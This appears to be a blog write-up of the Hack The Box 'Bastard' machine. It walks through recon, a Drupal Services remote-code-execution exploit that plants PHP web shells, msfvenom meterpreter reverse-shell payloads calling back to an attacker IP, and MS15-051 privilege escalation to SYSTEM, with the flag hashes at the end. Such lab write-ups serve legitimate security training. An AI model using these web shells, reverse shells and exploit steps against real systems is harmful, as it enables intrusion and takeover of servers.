---
layout: post
title:  "HTB Bastard Linux"
description : 
tags: 
---

# HTB Bastard

# Recon
Nmap scan
```ruby
PORT STATE SERVICE VERSION
80/tcp open http Microsoft IIS httpd 7.5
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods:
|_ Potentially risky methods: TRACE
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to 10.10.10.9 | 10.10.10.9
135/tcp open msrpc Microsoft Windows RPC
49154/tcp open msrpc Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
# Exploitation
According to the Changelog file the Drupal version running is 7.58. After a quick searchsploit we find
the closes exploit to the version
```shell
Drupal 7.x Module Services - Remote Code Execution | exploits/php/webapps/41564.php
```
We modified the following options:
```shell
$url = 'http://vmweb.lan/drupal-7.54';
$endpoint_path = '/rest_endpoint';
$endpoint = 'rest_endpoint';
$file = [
 'filename' => 'dixuSOspsOUU.php',
 'data' => '<?php eval(file_get_contents(\'php://input\')); ?>'
```
```shell
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';
$file = [
 'filename' => 'writeup.php',
 'data' => '<?php echo system($_GET["cmd"]); ?>'
```
We run the ./drupal.php file and it will create to two files **session.json** and **user.json**
We create a cookie with cookie manager and we use the session ID and session name from the
session.json file and we login as admin.
On the modules section we enable the **PHP Filter*
We create a php msfvenom shell and we execute it to get a reverse shell
```shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=9999 -e base64 -f raw > evil.php
```
However, shell is very limited and it crash when we try to spawn a windows shell. so we create another
msfvenom shell
but this time a windows/x64 as the target machine is a 64arch. and we upload it using the current php
shell
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=5555 -f exe > evil64.exe
```
# Privilege Escalation
We use the vuln: MS15-051 CVE-2015-1701
This exploit let us pass commands as system authority, so by passin the command "cmd" we get system
priv. Ex
```ruby
2/2
C:\inetpub\drupal-7.54>exploit-bastard.exe whoami
exploit-bastard.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 1500 created.
==============================
nt authority\system
C:\inetpub\drupal-7.54>exploit-bastard.exe cmd
exploit-bastard.exe cmd
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2588 created.
==============================
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\inetpub\drupal-7.54>whoami
whoami
nt authority\system
```

ROOT  4bf12b963da1b30cc93496f617f7ba7c 
USER  ba22fde1932d06eb76a163d312f921a2 
